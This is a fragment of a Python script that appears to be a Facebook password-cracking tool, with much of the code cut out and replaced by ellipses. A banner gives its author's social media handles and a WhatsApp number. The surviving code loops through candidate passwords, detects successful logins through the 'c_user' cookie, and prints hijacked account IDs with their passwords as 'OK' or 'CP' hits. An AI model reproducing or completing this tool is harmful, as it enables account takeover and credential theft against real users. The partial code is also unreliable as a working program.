...
══════════════════════════════════════════════════
  ...
  tool status   : Active 
  Facebook     : Ahsan
  Whatsapp    : 923422511736
  instagram   : Legend_mart_owner          
  
           JUST FUCK U MY HATERS
══════════════════════════════════════════════════"""
loop = 0
oks = []
cps = []
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\033[1;32m[legend-OK] '+cid+' | '+ps+'\033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[1;31m[legend-CP] '+cid+' | '+ps+'\033[0;97m')
